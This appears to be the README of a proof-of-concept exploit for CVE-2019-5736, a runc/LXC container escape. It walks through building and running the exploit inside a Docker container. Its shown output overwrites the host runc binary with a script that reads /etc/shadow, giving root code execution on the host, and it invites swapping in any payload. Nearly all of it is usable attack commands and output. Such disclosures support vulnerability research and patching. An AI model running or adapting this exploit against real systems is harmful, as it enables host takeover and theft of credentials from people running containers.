## CVE-2019-5736 ##

This is exploit code for CVE-2019-5736 (and it works for both runc and LXC).
The simplest way to use it is to copy the exploit code into an existing
container, and run `make.sh`. However, you could just as easily create a bad
image and run that.

```console
% docker run --rm --name pwnme -dit ubuntu:18.10 bash
pwnme
% docker cp CVE-2019-5736.tar pwnme:/CVE-2019-5736.tar
```

We need to install `gcc` to build the exploit, and `runc` because we need to
have the shared libraries that `runc` would use. We don't actually use the
`runc` binary itself. For LXC, you would install `lxc` instead of `runc`.

```console
% docker attach pwnme
# apt-get update && apt-get install -y gcc runc
[ snip ]
# tar xf CVE-2019-5736.tar
# ./CVE-2019-5736/make.sh
```

And now, `/bin/bash` in the container will be able to **overwrite the host runc
binary**. Since this binary is often executed by `root`, this allows for
root-level code execution on the host.

```
% docker exec -it pwnme /bin/bash
[+] bad_libseccomp.so booted.
[+] opened ro /proc/self/exe <3>.
[+] constructed fdpath </proc/self/fd/3>
[+] bad_init is ready -- see </tmp/bad_init_log> for logs.
[*] dying to allow /proc/self/exe to be unused...
% cat /usr/sbin/docker-runc
#!/bin/bash
touch /w00t_w00t ; cat /etc/shadow
```

And now if you try to use Docker normally, the malicious script will execute
with root privileges:

```
% docker exec -it pwnme /bin/good_bash
OCI runtime state failed: invalid character 'b' looking for beginning of value: unknown
% file /w00t_w00t
/w00t_w00t: empty
```

And obviously `make.sh` can be modified to make the evil path anything you
like. If you want to get access to the container, use `/bin/good_bash`.
